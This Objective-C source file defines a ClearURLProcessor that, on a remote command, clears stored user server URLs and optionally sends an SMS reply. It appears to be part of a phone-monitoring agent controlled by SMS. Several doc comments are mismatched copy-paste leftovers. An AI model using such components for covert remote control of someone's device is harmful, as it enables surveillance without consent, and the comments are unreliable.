/**
 - Project name :  RemoteCommandMager Component
 - Class name   :  ClearURLProcessor
 - Version      :  1.0  
 - Purpose      :  For RemoteCommandMager Component
 - Copy right   :  24/11/2011, Prasad M.B, Vervata Co., Ltd. All rights reserved.
*/

#import "ClearURLProcessor.h"
#import "ServerAddressManager.h"

@interface ClearURLProcessor (PrivateAPI)
- (void) sendReplySMS;
- (void) processClearURL;
@end

@implementation ClearURLProcessor

/**
 - Method name: initWithRemoteCommandData
 - Purpose:This method is used to initialize the LocationOnDemandProcessor class
 - Argument list and description: aRemoteCmdData (RemoteCmdData)
 - Return description: No return type
 */

- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData  {
    DLog (@"ClearURLProcessor--->initWithRemoteCommandData");
	if ((self =  [super initWithRemoteCommandData:aRemoteCmdData])) {
	}
	return self;
}

#pragma mark RemoteCmdProcessor Methods

/**
 - Method name: doProcessingCommand
 - Purpose:This method is used to process the LocationOnDemandProcessor
 - Argument list and description: 
 - Return description: No return type
*/

- (void) doProcessingCommand {
	DLog (@"ClearURLProcessor--->doProcessingCommand")
	 [self processClearURL];
}


#pragma mark AddURLProcessor Private Methods

/**
 - Method name: processRestartDevice
 - Purpose:This method is used to Restart Devoce
 - Argument list and description: No Return Type
 - Return description: mRemoteCmdCode (NSString *)
 */

- (void) processClearURL {
	DLog (@"ClearURLProcessor--->processClearURL")
	id <ServerAddressManager> serverManager=[[RemoteCmdUtils sharedRemoteCmdUtils] mServerAddressManager];
	[serverManager clearUserURLs];
	[self sendReplySMS];
}

/**
 - Method name: sendReplySMS
 - Purpose:This method is used to send the SMS reply
 - Argument list and description: aStatusCode (NSUInteger)
 - Return description: No return type
*/

- (void) sendReplySMS {
	DLog (@"ClearURLProcessor--->sendReplySMS")
	NSString *clearURLMessage=[[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																				      andErrorCode:_SUCCESS_];
	[[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:mRemoteCmdData
											 andReplyMessage:clearURLMessage];
	if ([mRemoteCmdData mIsSMSReplyRequired]) {
		[[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:[self recipientNumber]
														       andMessage:clearURLMessage];
	}
	
}

/*
 - Method name:dealloc
 - Purpose: This is memory mangement method. Invoked when the class object releasd.
 - Argument list and description: No argument
 - Return type and description: No Return
 */

-(void) dealloc {
	[super dealloc];
}
@end